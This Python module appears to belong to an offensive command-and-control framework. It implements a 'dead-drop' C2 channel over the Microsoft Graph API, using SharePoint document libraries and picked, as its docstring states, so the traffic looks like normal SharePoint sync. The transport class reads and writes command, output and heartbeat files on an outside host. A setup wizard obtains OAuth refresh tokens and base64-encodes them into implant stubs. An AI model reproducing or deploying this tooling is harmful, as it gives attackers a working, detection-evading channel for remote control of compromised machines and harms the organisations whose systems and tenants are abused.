"""
SharePoint provider — transport + deployment wizard.

Dead-drop C2 channel via Microsoft Graph API (SharePoint document libraries).
Ideal for domain-joined targets in Microsoft 365 environments — traffic is
indistinguishable from normal SharePoint synchronisation.

Token refresh: https://login.microsoftonline.com/{tenant}/oauth2/v2.0/token
File API:      https://graph.microsoft.com/v1.0/sites/{site_id}/drive/root:{path}:/content
Required scope: Sites.ReadWrite.All  offline_access  (delegated, requires admin consent)
"""
import base64
import re
from dataclasses import dataclass
from datetime import datetime
from pathlib import Path
from typing import Optional

import requests

from providers import _p, ask, ask_yn, err, info, ok, warn
from providers.base import (
    BaseConfig, BaseTransport, ProviderWizard, RateLimitedError, TRANSPORT_REGISTRY,
)

_HERE       = Path(__file__).parent
CREDS_FILE  = Path("credentials") / "sharepoint"

_GRAPH_BASE  = "https://graph.microsoft.com/v1.0"
_TOKEN_BASE  = "https://login.microsoftonline.com/"
_SCOPE       = "Sites.ReadWrite.All offline_access"


# ╔══════════════════════════════════════════════════════════════════════════════
# ║  SHAREPOINT TRANSPORT  (runtime channel)
# ╚══════════════════════════════════════════════════════════════════════════════

class SharePointTransport(BaseTransport):
    """Dead-drop transport over Microsoft Graph API (SharePoint)."""

    def __init__(self, creds: dict):
        self._client_id     = creds.get("CLIENT_ID", "")
        self._client_secret = creds.get("CLIENT_SECRET", "")
        self._tenant_id     = creds.get("TENANT_ID", "")
        self._refresh_token = creds.get("REFRESH_TOKEN", "")
        self._site_id       = creds.get("SITE_ID", "")
        self._token:        str   = ""
        self._token_expiry: float = 0.0

    def _token_url(self) -> str:
        return f"{_TOKEN_BASE}{self._tenant_id}/oauth2/v2.0/token"

    def _access_token(self) -> str:
        import time
        if self._token and time.time() < self._token_expiry - 60:
            return self._token
        try:
            r = requests.post(self._token_url(), data={
                "grant_type":    "refresh_token",
                "refresh_token": self._refresh_token,
                "client_id":     self._client_id,
                "client_secret": self._client_secret,
                "scope":         _SCOPE,
            }, timeout=15)
            d = r.json()
            self._token        = d.get("access_token", "")
            expires_in         = int(d.get("expires_in", 3600))
            self._token_expiry = time.time() + expires_in
            return self._token
        except Exception:
            return ""

    def _url(self, path: str, suffix: str = ":/content") -> str:
        return f"{_GRAPH_BASE}/sites/{self._site_id}/drive/root:{path}{suffix}"

    def upload(self, path: str, data: bytes) -> bool:
        token = self._access_token()
        if not token:
            return False
        try:
            r = requests.put(
                self._url(path),
                headers={
                    "Authorization": f"Bearer {token}",
                    "Content-Type":  "application/octet-stream",
                },
                data=data,
                timeout=30,
            )
            return r.status_code in (200, 201)
        except Exception:
            return False

    def download(self, path: str) -> Optional[bytes]:
        token = self._access_token()
        if not token:
            return None
        try:
            r = requests.get(
                self._url(path),
                headers={"Authorization": f"Bearer {token}"},
                timeout=30,
            )
            if r.status_code == 429:
                raise RateLimitedError("SharePoint rate limited")
            if r.status_code == 200:
                return r.content
            return None
        except RateLimitedError:
            raise
        except Exception:
            return None

    def delete(self, path: str) -> bool:
        token = self._access_token()
        if not token:
            return False
        try:
            r = requests.delete(
                self._url(path, ":"),
                headers={"Authorization": f"Bearer {token}"},
                timeout=30,
            )
            return r.status_code in (200, 204, 404)
        except Exception:
            return False


TRANSPORT_REGISTRY["sharepoint"] = SharePointTransport


# ============================================================
# SHAREPOINT CONFIG
# ============================================================

@dataclass
class SharePointConfig(BaseConfig):
    """BaseConfig + SharePoint OAuth2 credentials and site ID."""
    client_id:     str = ""
    client_secret: str = ""
    tenant_id:     str = ""
    refresh_token: str = ""
    site_id:       str = ""

    def save_creds(self) -> None:
        CREDS_FILE.parent.mkdir(parents=True, exist_ok=True)
        CREDS_FILE.write_text(
            "# SharePoint / Microsoft Graph OAuth2 Configuration\n"
            f"# Generated: {datetime.now().strftime('%a %b %d %I:%M:%S %p %Z %Y')}\n\n"
            f'CLIENT_ID="{self.client_id}"\n'
            f'CLIENT_SECRET="{self.client_secret}"\n'
            f'TENANT_ID="{self.tenant_id}"\n'
            f'REFRESH_TOKEN="{self.refresh_token}"\n'
            f'SITE_ID="{self.site_id}"\n'
        )
        CREDS_FILE.chmod(0o600)

    def load_creds(self) -> bool:
        if not CREDS_FILE.exists():
            return False
        for line in CREDS_FILE.read_text().splitlines():
            m = re.match(r'^(\w+)=["\']?(.*?)["\']?\s*$', line.strip())
            if m:
                k, v = m.group(1), m.group(2).strip()
                if k == "CLIENT_ID":     self.client_id     = v
                if k == "CLIENT_SECRET": self.client_secret = v
                if k == "TENANT_ID":     self.tenant_id     = v
                if k == "REFRESH_TOKEN": self.refresh_token = v
                if k == "SITE_ID":       self.site_id       = v
        return bool(self.client_id and self.client_secret
                    and self.refresh_token and self.site_id)


# ============================================================
# SHAREPOINT WIZARD
# ============================================================

class SharePointWizard(ProviderWizard):
    PROVIDER_ID   = "sharepoint"
    PROVIDER_NAME = "SharePoint"
    PROVIDER_ICON = "📁"
    TRANSPORT_DIR = _HERE / "transport"

    def _creds_path(self, deploy_dir: Path) -> Path:
        return deploy_dir / f".{self.PROVIDER_ID}_creds"

    def make_config(self) -> SharePointConfig:
        cfg = SharePointConfig()
        cfg.folder_path    = "/StratumOps"
        cfg.input_file     = "/cmd.log"
        cfg.output_file    = "/out.log"
        cfg.heartbeat_file = "/status.xml"
        return cfg

    def step_auth(self, cfg: SharePointConfig) -> None:
        self._step("Microsoft Graph OAuth2 Configuration (SharePoint)")

        if CREDS_FILE.exists():
            ans = ask(f"Found existing credentials ({CREDS_FILE}). Reuse? [Y/n]")
            if not ans or ans.lower().startswith("y"):
                if cfg.load_creds():
                    ok(f"Credentials loaded from {CREDS_FILE}")
                    return
                warn("Saved credentials incomplete — re-entering")

        _p([("", "")])
        _p([("class:yellow", "  ── SharePoint requires a work / school Azure AD tenant ──")])
        _p([("", "")])
        _p([("class:yellow", "  Step A — Register the app:")])
        info("— https://portal.azure.com/#view/Microsoft_AAD_RegisteredApps/ApplicationsListBlade")
        info("— New registration")
        info("    Name: anything (e.g. StratumHelper)")
        info("    Supported account types: Accounts in this organizational directory only")
        info("    Redirect URI: Web  →  http://localhost")
        info("— Register → Overview page → copy  Application (client) ID  (CLIENT_ID)")
        info("                           → copy  Directory (tenant) ID     (TENANT_ID)")
        _p([("", "")])
        _p([("class:yellow", "  Step B — Create a client secret:")])
        info("— Certificates & secrets → New client secret → Add")
        info("— Copy the VALUE column immediately (disappears on reload)")
        _p([("", "")])
        _p([("class:yellow", "  Step C — Add permissions (admin consent required):")])
        info("— API permissions → Add a permission → Microsoft Graph → Delegated")
        info("— Add:  Sites.ReadWrite.All   offline_access")
        info("— Grant admin consent for <your tenant>  (requires Global Admin or SharePoint Admin role)")
        _p([("", "")])

        cfg.client_id  = ask("CLIENT_ID (UUID from Overview page)")
        if not cfg.client_id:
            err("CLIENT_ID is required")
        cfg.client_secret = ask("CLIENT_SECRET (value from Certificates & secrets)")
        if not cfg.client_secret:
            err("CLIENT_SECRET is required")
        cfg.tenant_id = ask("TENANT_ID (Directory tenant ID from Overview page)")
        if not cfg.tenant_id:
            err("TENANT_ID is required")

        auth_url = (
            f"https://login.microsoftonline.com/{cfg.tenant_id}/oauth2/v2.0/authorize"
            f"?client_id={cfg.client_id}"
            f"&response_type=code"
            f"&redirect_uri=http://localhost"
            f"&scope=Sites.ReadWrite.All offline_access"
            f"&response_mode=query"
        )
        _p([("", "")])
        _p([("class:yellow", "  Step D — Authorize:")])
        info("Open this URL and sign in with a SharePoint-enabled work account:")
        _p([("class:green", f"\n  {auth_url}\n")])
        info("After redirect to localhost (connection refused) — copy the code= from the URL.")
        _p([("", "")])

        auth_code = ask("AUTHORIZATION CODE")
        if not auth_code:
            err("Authorization code is required")

        info("Exchanging code for refresh token...")
        try:
            r = requests.post(
                f"{_TOKEN_BASE}{cfg.tenant_id}/oauth2/v2.0/token",
                data={
                    "grant_type":    "authorization_code",
                    "code":          auth_code,
                    "redirect_uri":  "http://localhost",
                    "client_id":     cfg.client_id,
                    "client_secret": cfg.client_secret,
                    "scope":         "Sites.ReadWrite.All offline_access",
                },
                timeout=15,
            )
            data = r.json()
        except Exception as e:
            err(f"Token request failed: {e}")

        cfg.refresh_token = data.get("refresh_token", "")
        if not cfg.refresh_token:
            safe = {k: v for k, v in data.items() if k not in ("access_token", "refresh_token", "id_token")}
            info("Response: " + str(safe))
            err("Could not obtain refresh token")

        ok(f"Refresh token obtained ({len(cfg.refresh_token)} chars)")
        access_token = data.get("access_token", "")

        # Resolve SharePoint site ID from URL
        _p([("", "")])
        _p([("class:yellow", "  Step E — SharePoint site ID:")])
        info("Enter your SharePoint site URL (e.g. https://contoso.sharepoint.com/sites/IT)")
        site_url = ask("SharePoint site URL")
        if not site_url:
            err("Site URL is required")

        info("Resolving site ID via Graph API...")
        try:
            # Strip trailing slash and extract hostname + path
            site_url = site_url.rstrip("/")
            from urllib.parse import urlparse
            parsed = urlparse(site_url)
            hostname = parsed.netloc
            site_path = parsed.path  # e.g. /sites/IT
            lookup_url = f"{_GRAPH_BASE}/sites/{hostname}:{site_path}"
            r2 = requests.get(
                lookup_url,
                headers={"Authorization": f"Bearer {access_token}"},
                timeout=15,
            )
            site_data = r2.json()
            cfg.site_id = site_data.get("id", "")
        except Exception as e:
            warn(f"Site lookup failed: {e}")

        if not cfg.site_id:
            info("Automatic lookup failed. Enter SITE_ID manually.")
            info(f"  Run: curl -s '{_GRAPH_BASE}/sites/YOUR_HOSTNAME:/sites/YOUR_SITE' \\")
            info(f"       -H 'Authorization: Bearer ACCESS_TOKEN' | python3 -m json.tool")
            cfg.site_id = ask("SITE_ID")
            if not cfg.site_id:
                err("SITE_ID is required")
        # MED-11: validate site_id format (hostname,guid,guid)
        import re as _re
        if cfg.site_id and not _re.match(
            r'^[a-zA-Z0-9._-]+,[a-zA-Z0-9-]+,[a-zA-Z0-9-]+$', cfg.site_id
        ):
            err(f"SITE_ID format invalid: expected 'hostname,guid,guid', got: {cfg.site_id!r}")
        else:
            ok(f"Site ID: {cfg.site_id}")

        cfg.save_creds()
        ok("Credentials saved (reusable for future deployments)")

    def step_init_channel(self, cfg: SharePointConfig) -> None:
        self._step("SharePoint File Initialization")
        t = self._make_transport(cfg)
        for dest, body in [
            (cfg.folder_path + cfg.input_file,     b"MZ"),
            (cfg.folder_path + cfg.output_file,    b"MZ"),
            (cfg.folder_path + cfg.heartbeat_file, b"MZ"),
        ]:
            if t.upload(dest, body):
                ok(f"{dest} → initialized")
            else:
                warn(f"{dest} — upload failed; check site permissions")

    def _provider_subs(self, cfg: SharePointConfig) -> dict:
        b64 = lambda s: base64.b64encode(s.encode()).decode()
        return {
            "PLACEHOLDER_CLIENT_ID_B64":     b64(cfg.client_id),
            "PLACEHOLDER_CLIENT_SECRET_B64": b64(cfg.client_secret),
            "PLACEHOLDER_TENANT_ID_B64":     b64(cfg.tenant_id),
            "PLACEHOLDER_REFRESH_TOKEN_B64": b64(cfg.refresh_token),
            "PLACEHOLDER_SITE_ID_B64":       b64(cfg.site_id),
            "STUB_CLIENT_ID_B64":            b64(cfg.client_id),
            "STUB_CLIENT_SECRET_B64":        b64(cfg.client_secret),
            "STUB_TENANT_ID_B64":            b64(cfg.tenant_id),
            "STUB_REFRESH_TOKEN_B64":        b64(cfg.refresh_token),
            "STUB_SITE_ID_B64":              b64(cfg.site_id),
        }

    def _native_agent_extra_env(self, cfg: SharePointConfig) -> dict:
        return {
            "STRATUM_APP_KEY":       cfg.client_id,
            "STRATUM_APP_SECRET":    cfg.client_secret,
            "STRATUM_TENANT_ID":     cfg.tenant_id,
            "STRATUM_REFRESH_TOKEN": cfg.refresh_token,
            "STRATUM_SITE_ID":       cfg.site_id,
            "STRATUM_PROVIDER":      "sharepoint",
        }

    def _make_transport(self, cfg: SharePointConfig) -> SharePointTransport:
        return SharePointTransport({
            "CLIENT_ID":     cfg.client_id,
            "CLIENT_SECRET": cfg.client_secret,
            "TENANT_ID":     cfg.tenant_id,
            "REFRESH_TOKEN": cfg.refresh_token,
            "SITE_ID":       cfg.site_id,
        })
